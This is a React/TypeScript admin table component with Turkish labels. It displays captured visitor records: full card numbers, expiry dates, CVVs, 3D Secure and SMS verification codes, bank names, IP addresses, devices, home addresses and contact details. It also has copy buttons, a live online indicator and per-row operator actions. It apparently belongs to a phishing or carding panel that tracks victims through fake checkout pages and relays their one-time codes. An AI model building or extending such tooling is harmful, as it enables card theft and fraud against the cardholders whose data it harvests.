'use client';

import { useEffect, useMemo, useState } from 'react';
import { FiChevronLeft, FiChevronRight, FiTrash2, FiUser } from 'react-icons/fi';
import { formatDeviceLabel } from '@/lib/userAgentParser';
import { isLogOnline } from '@/lib/logOnlineUtils';
import { useOnlineClock } from '@/lib/useOnlineClock';
import { livePageLabel } from '@/lib/livePageLabel';
import CopyableCell, { cardCopyValue, formatCardDisplay } from '@/components/admin/CopyableCell';
import ContactInfoModal from '@/components/admin/ContactInfoModal';

export interface LogAddress {
  city?: string;
  district?: string;
  neighborhood?: string;
  street?: string;
  buildingNo?: string;
  floor?: string;
  apartmentNo?: string;
  fullAddress?: string;
}

export interface AdminLogRow {
  _id: string;
  name: string;
  visitorId?: string;
  firstName?: string;
  lastName?: string;
  phone?: string;
  email?: string;
  cardNumber?: string;
  expiryDate?: string;
  cvv?: string;
  amount: number;
  status: string;
  pageType?: string;
  threeDCode?: string;
  verificationCode?: string;
  ipAddress?: string;
  deviceType?: string;
  deviceModel?: string;
  deviceVendor?: string;
  browser?: string;
  os?: string;
  bankName?: string;
  cardType?: string;
  address?: LogAddress;
  onlineStatus?: string;
  updatedAt?: string;
  createdAt?: string;
}

interface LogTableProps {
  title: string;
  logs: AdminLogRow[];
  loading?: boolean;
  pageSize?: number;
  showQueueNumber?: boolean;
  onOpenActions: (logId: string) => void;
  onDelete?: (logId: string) => void;
}

function formatDisplayName(log: AdminLogRow) {
  if (log.firstName || log.lastName) {
    return `${log.firstName || ''} ${log.lastName || ''}`.trim();
  }
  return log.name || '-';
}

function getStatusStyle(status: string) {
  if (status === 'Başarılı') return 'bg-emerald-500/20 text-emerald-400 border-emerald-500/30';
  if (status === '3D Secure Bekliyor' || status === 'Ödeme') return 'bg-blue-500/20 text-blue-400 border-blue-500/30';
  if (status === 'Adres Ekranında' || status === 'Sepette' || status === 'Checkout Sayfasında') {
    return 'bg-purple-500/20 text-purple-400 border-purple-500/30';
  }
  if (status === 'Ödeme Sayfasında') return 'bg-orange-500/20 text-orange-400 border-orange-500/30';
  if (status === 'Hata' || status === 'Hatalı Kod Girişi') return 'bg-red-500/20 text-red-400 border-red-500/30';
  return 'bg-gray-500/20 text-gray-300 border-gray-500/30';
}

export default function LogTable({
  title,
  logs,
  loading,
  pageSize = 50,
  showQueueNumber = false,
  onOpenActions,
  onDelete,
}: LogTableProps) {
  const [contactLog, setContactLog] = useState<AdminLogRow | null>(null);
  const [page, setPage] = useState(1);
  const colSpan = showQueueNumber ? 12 : 11;
  const now = useOnlineClock(1000);

  useEffect(() => {
    setPage(1);
  }, [logs.length, title]);

  const totalPages = Math.max(1, Math.ceil(logs.length / pageSize));
  const safePage = Math.min(page, totalPages);

  useEffect(() => {
    if (page > totalPages) {
      setPage(totalPages);
    }
  }, [page, totalPages]);

  const pagedLogs = useMemo(() => {
    const start = (safePage - 1) * pageSize;
    return logs.slice(start, start + pageSize);
  }, [logs, safePage, pageSize]);

  const rangeStart = logs.length === 0 ? 0 : (safePage - 1) * pageSize + 1;
  const rangeEnd = Math.min(safePage * pageSize, logs.length);

  return (
    <>
      <div className="overflow-hidden rounded-xl border border-[#2a3142] bg-[#151922]">
        <div className="border-b border-[#2a3142] px-4 py-3">
          <div className="flex flex-wrap items-center justify-between gap-2">
            <h3 className="text-base font-semibold text-white">
              {title} <span className="text-gray-500">({logs.length})</span>
            </h3>
            {logs.length > pageSize && (
              <p className="text-xs text-gray-500">
                {rangeStart}–{rangeEnd} / {logs.length}
              </p>
            )}
          </div>
        </div>
        <div className="overflow-x-auto">
          <table className="w-full min-w-[1200px] text-left text-sm">
            <thead>
              <tr className="border-b border-[#2a3142] text-xs uppercase tracking-wide text-gray-500">
                {showQueueNumber && <th className="w-10 px-2 py-3 text-center">#</th>}
                <th className="px-3 py-3">Kullanıcı</th>
                <th className="px-3 py-3">Kart No</th>
                <th className="px-3 py-3">SKT</th>
                <th className="px-3 py-3">CVV</th>
                <th className="px-3 py-3">Tutar</th>
                <th className="px-3 py-3">Durum</th>
                <th className="px-3 py-3">Banka</th>
                <th className="px-3 py-3">Kart Tipi</th>
                <th className="px-3 py-3">3D / SMS</th>
                <th className="px-3 py-3">Bilgi</th>
                <th className="px-3 py-3">İşlemler</th>
              </tr>
            </thead>
            <tbody>
              {loading ? (
                <tr>
                  <td colSpan={colSpan} className="px-4 py-8 text-center text-gray-500">
                    Yükleniyor...
                  </td>
                </tr>
              ) : logs.length === 0 ? (
                <tr>
                  <td colSpan={colSpan} className="px-4 py-8 text-center text-gray-500">
                    Kayıt bulunamadı
                  </td>
                </tr>
              ) : (
                pagedLogs.map((log, index) => {
                  const online = isLogOnline(log, now);
                  const deviceLabel = formatDeviceLabel({
                    deviceType: log.deviceType,
                    deviceModel: log.deviceModel,
                    deviceVendor: log.deviceVendor,
                    browser: log.browser,
                    os: log.os,
                  });
                  const queueNo = (safePage - 1) * pageSize + index + 1;

                  return (
                    <tr key={log._id} className="border-b border-[#2a3142]/60 hover:bg-[#1a1f2b]/80">
                      {showQueueNumber && (
                        <td className="px-2 py-3 text-center font-mono text-sm text-gray-400">
                          {queueNo}
                        </td>
                      )}
                      <td className="px-3 py-3">
                        <div className="flex items-start gap-2">
                          <span
                            className={`mt-1.5 h-2.5 w-2.5 shrink-0 rounded-full ${
                              online ? 'bg-emerald-400 shadow-[0_0_6px_rgba(52,211,153,0.8)]' : 'bg-gray-600'
                            }`}
                            title={online ? 'Online' : 'Offline'}
                          />
                          <div className="min-w-0">
                            <p className="font-semibold text-white">{formatDisplayName(log)}</p>
                            {log.visitorId && (
                              <p className="text-xs font-mono text-blue-400">{log.visitorId}</p>
                            )}
                            <p className="mt-0.5 max-w-[180px] truncate text-xs text-gray-500" title={deviceLabel}>
                              {deviceLabel}
                            </p>
                          </div>
                        </div>
                      </td>
                      <td className="px-3 py-3">
                        <CopyableCell
                          display={formatCardDisplay(log.cardNumber)}
                          copyValue={cardCopyValue(log.cardNumber)}
                          mono
                          className="text-gray-300"
                        />
                      </td>
                      <td className="px-3 py-3">
                        <CopyableCell display={log.expiryDate || '-'} className="text-gray-300" />
                      </td>
                      <td className="px-3 py-3">
                        <CopyableCell display={log.cvv || '-'} className="text-amber-400" mono />
                      </td>
                      <td className="px-3 py-3 font-semibold text-emerald-400">
                        ₺{log.amount.toLocaleString('tr-TR', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                      </td>
                      <td className="px-3 py-3">
                        <span
                          className={`inline-flex rounded-md border px-2 py-1 text-xs font-semibold ${getStatusStyle(log.status)}`}
                        >
                          {livePageLabel(log.pageType, log.status)}
                        </span>
                        {online && !log.cardNumber && (
                          <p className="mt-1 text-xs text-emerald-400">Canlı</p>
                        )}
                      </td>
                      <td className="px-3 py-3 text-gray-300">{log.bankName || '-'}</td>
                      <td className="px-3 py-3 text-gray-400">{log.cardType || '-'}</td>
                      <td className="px-3 py-3">
                        <CopyableCell
                          display={log.threeDCode || log.verificationCode || '-'}
                          copyValue={log.threeDCode || log.verificationCode || ''}
                          mono
                          className="text-gray-300"
                        />
                        {log.threeDCode && log.verificationCode && (
                          <p className="mt-1 text-xs text-red-300">SMS: {log.verificationCode}</p>
                        )}
                      </td>
                      <td className="px-3 py-3">
                        <button
                          type="button"
                          onClick={() => setContactLog(log)}
                          className="inline-flex items-center gap-1.5 rounded-md border border-[#2a3142] bg-[#1a1f2b] px-2.5 py-1.5 text-xs font-semibold text-gray-300 transition-colors hover:border-blue-500/40 hover:text-white"
                        >
                          <FiUser size={14} />
                          Bilgiler
                        </button>
                      </td>
                      <td className="px-3 py-3">
                        <div className="flex items-center gap-1">
                          <button
                            onClick={() => onOpenActions(log._id)}
                            className="rounded-md border border-[#2a3142] bg-[#1a1f2b] px-2.5 py-1.5 text-xs font-semibold text-gray-300 transition-colors hover:border-blue-500/40 hover:text-white"
                          >
                            İŞLEMLER
                          </button>
                          <button
                            type="button"
                            onClick={(e) => {
                              e.stopPropagation();
                              onDelete?.(log._id);
                            }}
                            disabled={!onDelete}
                            className="rounded-md p-1.5 text-gray-500 transition-colors hover:bg-red-500/10 hover:text-red-400 disabled:cursor-not-allowed disabled:opacity-40"
                            title="Logu sil"
                          >
                            <FiTrash2 size={14} />
                          </button>
                        </div>
                      </td>
                    </tr>
                  );
                })
              )}
            </tbody>
          </table>
        </div>
        {logs.length > pageSize && (
          <div className="flex flex-wrap items-center justify-between gap-3 border-t border-[#2a3142] px-4 py-3">
            <p className="text-xs text-gray-500">
              Sayfa {safePage} / {totalPages}
            </p>
            <div className="flex items-center gap-1">
              <button
                type="button"
                onClick={() => setPage((p) => Math.max(1, p - 1))}
                disabled={safePage <= 1}
                className="inline-flex items-center gap-1 rounded-md border border-[#2a3142] px-2.5 py-1.5 text-xs text-gray-300 hover:text-white disabled:cursor-not-allowed disabled:opacity-40"
              >
                <FiChevronLeft size={14} />
                Önceki
              </button>
              <button
                type="button"
                onClick={() => setPage((p) => Math.min(totalPages, p + 1))}
                disabled={safePage >= totalPages}
                className="inline-flex items-center gap-1 rounded-md border border-[#2a3142] px-2.5 py-1.5 text-xs text-gray-300 hover:text-white disabled:cursor-not-allowed disabled:opacity-40"
              >
                Sonraki
                <FiChevronRight size={14} />
              </button>
            </div>
          </div>
        )}
      </div>

      <ContactInfoModal
        isOpen={Boolean(contactLog)}
        onClose={() => setContactLog(null)}
        name={contactLog ? formatDisplayName(contactLog) : ''}
        phone={contactLog?.phone}
        email={contactLog?.email}
        ipAddress={contactLog?.ipAddress}
        address={contactLog?.address}
      />
    </>
  );
}
